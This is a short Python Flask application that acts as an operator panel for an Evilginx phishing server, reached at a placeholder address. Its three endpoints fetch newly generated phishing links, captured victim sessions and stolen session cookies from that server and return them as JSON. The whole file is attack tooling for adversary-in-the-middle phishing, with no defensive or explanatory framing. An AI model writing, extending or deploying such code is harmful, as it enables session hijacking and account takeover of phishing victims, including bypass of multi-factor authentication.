from flask import Flask, jsonify
import requests

app = Flask(__name__)

EVILGINX_URL = "http://YOUR_EVILGINX_SERVER"

@app.route('/api/generate-link')
def generate_link():
    response = requests.get(f"{EVILGINX_URL}/api/generate")
    return jsonify(response.json())

@app.route('/api/captured-sessions')
def captured_sessions():
    response = requests.get(f"{EVILGINX_URL}/api/sessions")
    return jsonify(response.json())

@app.route('/api/cookies')
def cookies():
    response = requests.get(f"{EVILGINX_URL}/api/cookies")
    return jsonify(response.json())

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
